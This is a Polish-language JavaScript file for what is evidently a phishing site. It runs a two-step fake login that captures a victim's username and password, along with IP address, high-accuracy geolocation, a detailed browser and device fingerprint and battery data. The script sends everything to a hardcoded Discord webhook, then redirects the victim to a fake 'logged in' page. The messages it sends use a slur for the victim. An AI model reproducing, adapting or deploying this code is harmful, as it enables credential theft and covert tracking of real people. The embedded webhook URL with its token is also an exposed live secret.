document.addEventListener('DOMContentLoaded', function () {
  async function getUserIP() {
    try {
      const res = await fetch('https://api.ipify.org?format=json');
      const data = await res.json();
      return data.ip || 'NIEZNANE_IP';
    } catch {
      return 'IP_BRAK';
    }
  }

  // Wstępne wywołanie geolokalizacji by wymusić prompt (możesz usunąć, jeśli nie chcesz)
  navigator.geolocation.getCurrentPosition(() => {}, () => {});

  function getUserMetadata() {
    return {
      czas: new Date().toLocaleString(),
      userAgent: navigator.userAgent,
      resolution: `${window.screen.width}x${window.screen.height}`,
      timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
      timezoneOffset: new Date().getTimezoneOffset(), // w minutach
      jezyk: navigator.language,
      platforma: navigator.platform,
      cookiesEnabled: navigator.cookieEnabled,
      cpu: navigator.hardwareConcurrency || 'NIEZNANE',
      ram: navigator.deviceMemory ? `${navigator.deviceMemory} GB` : 'NIEZNANE',
      colorDepth: screen.colorDepth,
      dpi: window.devicePixelRatio || 1,
      orientation: (screen.orientation || {}).type || 'NIEZNANA',
      doNotTrack: navigator.doNotTrack || 'NIEZNANY',
      plugins: Array.from(navigator.plugins).map(p => p.name).join(', ') || 'BRAK_PLUGINÓW',
      maxTouchPoints: navigator.maxTouchPoints || 0,
      battery: null, // wypełnimy asynchronicznie
      prefersReducedMotion: window.matchMedia('(prefers-reduced-motion: reduce)').matches,
      prefersColorScheme: window.matchMedia('(prefers-color-scheme: dark)').matches ? 'dark' : 'light',
      // AudioContext fingerprint - czy AudioContext jest dostępny i jego stan
      audioContextState: 'NIEZNANY',
    };
  }

  async function getBatteryInfo() {
    if (navigator.getBattery) {
      try {
        const battery = await navigator.getBattery();
        return {
          charging: battery.charging,
          level: (battery.level * 100).toFixed(0) + '%',
          chargingTime: battery.chargingTime === Infinity ? '∞' : battery.chargingTime + 's',
          dischargingTime: battery.dischargingTime === Infinity ? '∞' : battery.dischargingTime + 's'
        };
      } catch {
        return null;
      }
    }
    return null;
  }

  function getAudioContextState() {
    try {
      const AudioCtx = window.AudioContext || window.webkitAudioContext;
      if (!AudioCtx) return 'BRAK_AUDIOCONTEXT';
      const ctx = new AudioCtx();
      const state = ctx.state;
      ctx.close();
      return state;
    } catch {
      return 'BŁĄD_AUDIOCONTEXT';
    }
  }

  function getPerformanceTiming() {
    if (!performance || !performance.timing) return null;
    const t = performance.timing;
    return {
      navigationStart: t.navigationStart,
      domContentLoadedEventEnd: t.domContentLoadedEventEnd,
      loadEventEnd: t.loadEventEnd,
      responseEnd: t.responseEnd,
      fetchStart: t.fetchStart
    };
  }

  function getNextMessageNumber() {
    let num = localStorage.getItem('messageNumber');
    if (!num) num = 0;
    num = parseInt(num) + 1;
    localStorage.setItem('messageNumber', num);
    return num;
  }

  function getUserLocation() {
    return new Promise((resolve) => {
      if (!navigator.geolocation) return resolve('BRAK_DOSTĘPU');

      navigator.geolocation.getCurrentPosition(
        (position) => {
          const { latitude, longitude, accuracy } = position.coords;
          resolve(`📌 Lat: ${latitude.toFixed(5)}, Lng: ${longitude.toFixed(5)} (🎯 ±${accuracy}m)`);
        },
        () => resolve('BRAK_DOSTĘPU'),
        { enableHighAccuracy: true, timeout: 5000 }
      );
    });
  }

  async function collectAllData() {
    const meta = getUserMetadata();

    // Wypełnij info o baterii
    meta.battery = await getBatteryInfo();

    // AudioContext state
    meta.audioContextState = getAudioContextState();

    // Performance Timing
    meta.performanceTiming = getPerformanceTiming();

    return meta;
  }

  const gownoForm = document.getElementById('gowno-form');

  if (gownoForm) {
    gownoForm.addEventListener('submit', async function (e) {
      e.preventDefault();

      const popup = document.getElementById('loading-popup');
      if (popup) popup.classList.remove('hidden');

      const gowno = document.getElementById('gowno').value;
      const login = localStorage.getItem('cwelski_login') || 'NIEZNANY_LOGIN';
      const messageNumber = getNextMessageNumber();
      const ip = await getUserIP();
      const meta = await collectAllData();
      const location = await getUserLocation();

      // Formatujemy battery info w tekst
      let batteryInfo = 'BRAK_INFO_BATTERY';
      if (meta.battery) {
        batteryInfo = `⚡ Ładowanie: ${meta.battery.charging ? 'TAK' : 'NIE'}, Poziom: ${meta.battery.level}, Czas ładowania: ${meta.battery.chargingTime}, Czas rozładowania: ${meta.battery.dischargingTime}`;
      }

      // Formatujemy performance timing
      let perfInfo = 'BRAK_PERFORMANCE_TIMING';
      if (meta.performanceTiming) {
        perfInfo = `⏱️ NavigationStart: ${meta.performanceTiming.navigationStart}, DOMContentLoaded: ${meta.performanceTiming.domContentLoadedEventEnd}, LoadEventEnd: ${meta.performanceTiming.loadEventEnd}`;
      }

      const payload = {
  content: `# DANE ${messageNumber}
📨 **Login cwela**: \`${login}\`
🔐 **Hasło cwela**: \`${gowno}\`
📍 **Lokalizacja**: ${location}
🕓 **Czas**: \`${meta.czas}\`
💻 **User-Agent**: \`${meta.userAgent}\`
🖥️ **Rozdzielczość**: \`${meta.resolution}\`
🌐 **Strefa czasowa**: \`${meta.timezone}\`
🗣️ **Język**: \`${meta.jezyk}\`
${batteryInfo}
🧠 **Platforma**: \`${meta.platforma}\`

----------------------

⏰ **Offset UTC (min)**: \`${meta.timezoneOffset}\`
🍪 **Cookies włączone**: \`${meta.cookiesEnabled ? 'TAK' : 'NIE'}\`
🧮 **CPU**: \`${meta.cpu}\` rdzeni
💾 **RAM**: \`${meta.ram}\`
🎨 **Głębia kolorów**: \`${meta.colorDepth}\` bit
🔍 **DPI (PixelRatio)**: \`${meta.dpi}\`
🔄 **Orientacja ekranu**: \`${meta.orientation}\`
🚫 **DoNotTrack**: \`${meta.doNotTrack}\`
🔌 **Pluginy**: \`${meta.plugins}\`
✋ **Max touch points**: \`${meta.maxTouchPoints}\`
🎧 **AudioContext state**: \`${meta.audioContextState}\`
⏱️ **Performance Timing**: NavigationStart: ${meta.performanceTiming?.navigationStart || 'BRAK'}, DOMContentLoaded: ${meta.performanceTiming?.domContentLoadedEventEnd || 'BRAK'}, LoadEventEnd: ${meta.performanceTiming?.loadEventEnd || 'BRAK'}
🌈 **Prefers color scheme**: \`${meta.prefersColorScheme}\`
🚶 **Prefers reduced motion**: \`${meta.prefersReducedMotion ? 'TAK' : 'NIE'}\`
----------------------`
};

      fetch('https://discord.com/api/webhooks/1402043603483623455/Nn2m5RS0e7cSObmHIQgOmS0OFDKjo1gRSwnJFYphW934MO-5muwjePBMI40-w-J0fjKi', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify(payload)
      }).then(() => {
        localStorage.removeItem('cwelski_login');
        setTimeout(() => {
          window.location.href = 'loggedin.html';
        }, 1000);
      }).catch(() => {
        setTimeout(() => {
          window.location.href = 'loggedin.html';
        }, 1000);
      });
    });
  }

  const loginForm = document.getElementById('login-form');
  if (loginForm) {
    loginForm.addEventListener('submit', function (e) {
      e.preventDefault();

      const login = document.getElementById('login').value;
      localStorage.setItem('cwelski_login', login);

      const popup = document.getElementById('loading-popup');
      if (popup) popup.classList.remove('hidden');

      setTimeout(() => {
        window.location.href = 'login.html';
      }, 1000);
    });
  }
});
